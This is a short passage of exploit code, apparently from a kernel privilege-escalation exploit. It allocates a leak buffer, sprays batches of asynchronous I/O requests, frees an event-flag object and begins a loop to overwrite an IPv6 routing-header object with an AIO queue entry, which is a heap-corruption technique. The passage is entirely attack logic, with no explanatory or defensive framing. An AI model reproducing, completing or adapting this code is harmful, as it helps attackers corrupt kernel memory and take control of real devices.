    buf = alloc(max_leak_len)

    num_elems = MAX_AIO_IDS
    aio_reqs = make_reqs1(num_elems)

    num_batches = 2
    aio_ids_len = num_batches * num_elems
    aio_ids = alloc(4 * aio_ids_len)

    debug_log("start overwrite rthdr with AIO queue entry loop")
    aio_not_found = True
    free_evf(evf)

